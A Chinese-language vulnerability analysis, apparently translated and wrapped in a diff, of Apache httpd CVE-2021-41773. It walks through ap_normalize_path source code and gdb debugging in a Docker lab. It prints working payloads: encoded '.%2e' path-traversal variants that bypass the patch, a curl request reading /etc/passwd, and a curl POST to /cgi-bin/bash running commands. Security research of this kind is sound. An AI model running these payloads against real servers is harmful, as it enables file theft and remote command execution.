@@ -1,0 +1,155 @@
+# Apache httpd Server CVE-2021-41773 漏洞分析
+|
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+## 0x01 漏洞简介
+Apache httpd Server 2.4.49 版本引入了一个具有路径穿越漏洞的新函数，但需要配合穿越的目录配置 Require all
+granted，攻击者可利用该漏洞实现路径穿越从而读取任意文件，或者在配置了cgi的httpd程序中执行bash指令，从而有机会控制服务器。
+## 0x02 环境搭建
+###  0x1 docker搭建
+在搭建环境的过程中制作了一个docker容器，方便以后对该漏洞进行复现分析。  
+安装方式如下
+    docker run -p 8787:80 -d --privileged turkeys/httpd:cve-2021-41773
+关于httpd的编译过程可参考
+[https://www.yuque.com/docs/share/771a78c6-7fca-44c7-9cb3-6d1fb3594921](https://www.yuque.com/docs/share/771a78c6-7fca-44c7-9cb3-6d1fb3594921?#)
+制作docker的文件也放在github 
+，下载下来后直接执行如下指令
+    docker-compose up -d
+###  0x2 调试
+环境有安装好的pwndbg插件，在调试的时候需要注意kill掉root起的httpd进程，只保留一个daemon httpd用来调试
+    gdb --pid 1074
+源码调试界面如下
+## 0x03 漏洞分析
+在调试漏洞之前首先给自己提出了几个问题，带着这几个问题去分析漏洞，才会更加理解漏洞的核心原理。其次通过httpd源码调试无死角窥探漏洞触发过程。
+###  0x1 问题
+在见到poc之后心里面就有几个问题一直没有得到解决
+  * 路径穿越poc为什么是.%2e开始，%2e.不行吗？
+  * 补丁绕过poc是依据什么怎么构造出来的？
+  * cgi命令执行poc如何构造，为什么执行的命令在post参数里？
+带着这三个问题开始CVE-2021-41773 源码调试漏洞分析之路
+###  0x2 路径穿越poc如何构造
+这一切还要和2.4.49版本的httpd在server/request.c中引入的新代码有关，如下图所示
+关键代码如下，根据httpd自身的注释可以了解到这部分代码的功能是删除/./和/../一些路径，其中还描写到该部分代码是为了避免ap_unescape_url后的双重解码，但是补丁就是因为双重解码绕过的。
+        if (r->parsed_uri.path) {
+            /* Normalize: remove /./ and shrink /../ segments, plus
+             * decode unreserved chars (first time only to avoid
+             * double decoding after ap_unescape_url() below).
+             */
+            if (!ap_normalize_path(r->parsed_uri.path,
+                                   normalize_flags |
+                                   AP_NORMALIZE_DECODE_UNRESERVED)) {
+                ap_log_rerror(APLOG_MARK, APLOG_ERR, 0, r, APLOGNO(10244)
+                              "invalid URI path (%s)", r->unparsed_uri);
+                return HTTP_BAD_REQUEST;
+            }
+        }
+接下来到这次漏洞的核心函数ap_normalize_path，第一段代码如下
+    int ret = 1;
+    apr_size_t l = 1, w = 1;
+    if (!IS_SLASH(path[0])) {
+            /* 除了 "OPTIONS *", 每个请求路径都应该是以 '/' 开头*/
+            if (path[0] == '*' && path[1] == '\0') {
+                return 1;
+            }
+            /* 如果开启了AP_NORMALIZE_ALLOW_RELATIVE配置就能绕过这个限制 */
+            if (!(flags & AP_NORMALIZE_ALLOW_RELATIVE) || path[0] == '\0') {
+                return 0;
+            }
+            l = w = 0;
+        }
+可以看到在代码的开始部分设定了w和l变量，其实是使用了双索引的方式遍历path数组，完成对path字符串的编码解析和../删除工作。其中w指针有回退功能，l指针只会前进，而且w指针永远指的是真实path将要填充的字符，所以在做字符串判断的时候一直使用w-1偏移进行索引。
+            if ((flags & AP_NORMALIZE_DECODE_UNRESERVED)
+                    && path[l] == '%' && apr_isxdigit(path[l + 1])
+                                      && apr_isxdigit(path[l + 2])) {
+                const char c = x2c(&path[l + 1]);
+                if (apr_isalnum(c) || (c && strchr("-._~", c))) {
+                    /* 如果解码成功l指针移动到编码的最后一位，且将解码后的值复制给path[l] */
+                    l += 2;
+                    path[l] = c;
+                }
+            }
+在这段代码之后真正的 **漏洞代码** 出现了
+    if (w == 0 || IS_SLASH(path[w - 1])) {
+        /* Collapse ///// sequences to / */
+        .......
+        if (path[l] == '.') {
+            /* Remove /./ segments */
+            if (IS_SLASH_OR_NUL(path[l + 1])) {
+                l++;
+                if (path[l]) {
+                    l++;
+                }
+                continue;
+            }
+            /* Remove /xx/../ segments */
+            if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
+                /* 如果l遇到了../开始让w回退到上一个/，不然的话就赋值 */
+                if (w > 1) {
+                    do {
+                        w--;
+                    } while (w && !IS_SLASH(path[w - 1]));
+                }
+                else {
+                    /* 如果w回退到0且后续没有内容则报错  */
+                    if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) {
+                        ret = 0;
+                    }
+                }
+                /* 因为../的关系让l指针前进两个索引 */
+                l += 2;
+                if (path[l]) {
+                    l++;
+                }
+                continue;
+            }
+        }
+    }
+漏洞逻辑已经很明显了在上述代码的第十五行，l遇到../才让w回退到上一个/，不然的话就将路径原模原样赋值给w指针。那么.的url编码是%2e，如果遇到%2e./就会回退，因为会先进行url解码l索引就变成了../，但如果是.%2e/在执行这段../回退代码的时候检测不出来../就会先把.赋值给w指针，之后l在%2e进行解码变成了./但是因为w已经前进了一个索引
+**IS_SLASH(path[w – 1])**
+就无法判断成功所以代码又将./依次赋值给了w指针。从而让path变量中拥有了解码好的/../路径片段，实现了路径穿越。代码的艺术就是这么奇妙，因为没有妥善处理特殊情况造成了严重漏洞，这给代码开发人员敲响了警钟。
+经过分析%2e%2e/路径也可以达到同样的目的，在实际调试过程中也是如此，在进入ap_normalize_path函数的路径为未解析的原始路径。
+函数解析后r-parsed_uri.path 为含有路径穿越的../目录，从而实现路径穿越
+最后在ap_invoke_handler函数中调用ap_run_handler进行路径解析，读取权限允许范围内的文件内容，ap_run_handler实际为挂钩函数，其中注册了很多处理函数。
+###  0x3 补丁绕过poc构造
+补丁分析，判断了.%2e/以及%2e%2e/这两种情况
+在后续的代码审计过程中发现了ap_unescape_url函数，该函数功能为解码url字符编码。因此又存在了几种poc构造方式，简单的构造原则为只要一开始时的路径不是../且在二次解码后的路径为../就能满足条件
+    /%2%65./
+    /%2%65%2e/
+    /.%2%65/
+    /%2e%2%65/  
+    /%2%65%2%65/
+    /%%32e%%32e/
+    /%25%32%65%25%32%65/ # 这种是不生效的，因为ap_normalize_path不会处理%字符的url编码
+    curl -s --path-as-is "http://localhost:8787/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+###  0x4 命令执行poc构造
+在/etc/httpd/httpd.conf配置文件中去掉mod_cgid.so那行的注释
+主要研究在cgi模式下如何进行命令执行，路径穿越部分上面已经分析的很清楚了，困扰我的其实是命令为什么是在post参数中。笔者首先用gdb调试了命令执行的过程，kill掉root进程，保留剩下的worker进程
+    curl -d 'id>/tmp/a' "http://localhost:8787/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash"
+直接将断点下在execve函数上，尝试分析命令执行时post参数是怎么带入执行的
+参数内容只有/bin/bash
+环境变量部分内容挺多，编写了gdb脚本循环遍历
+    define printall
+        set $i = $arg0
+        while *(unsigned long long *)$i !=0
+            x/s *(unsigned long long *)$i
+            set $i = $i + 8
+        end
+    end
+用脚本跑完后，post参数也没在环境变量中，只有CONTENT_LENGTH为9，这正好是id>/tmp/a命令的长度。那么该漏洞到底是如何传递命令执行参数的呢？
+#
+笔者猜测是httpd将执行的命令重定向到了cgi程序的输入流中了，因此编写了接受输入流的bash脚本放在cgi-bin目录下，脚本内容如下
+    #!/bin/sh
+    read content
+    echo $content > /tmp/xxx
+发送如下数据包
+    curl -d 'id>/tmp/x'  "http://localhost:8787/cgi-bin/1.sh"
+结果如下
+那么可以证明post参数确实是以输入流的方式传入到cgi程序中，这就不难理解为什么命令执行部分构造成
+    A=|id>/tmp/x
+    id>/tmp/x
+至于echo;id如何做到命令回显，还没有深究
+## 0x04 总结
+这个apache httpd
+路径穿越漏洞非常有意思，最后代码维护人员把ap_unescape_url删掉了避免二次解码漏洞的发生，简单粗暴。在复现这个漏洞的过程中也学习到了一些调试技巧，同时也解决了这段时间困扰笔者的几个问题。文笔粗糙，有什么问题请大家多多指正。
+## 0x05 参考文献
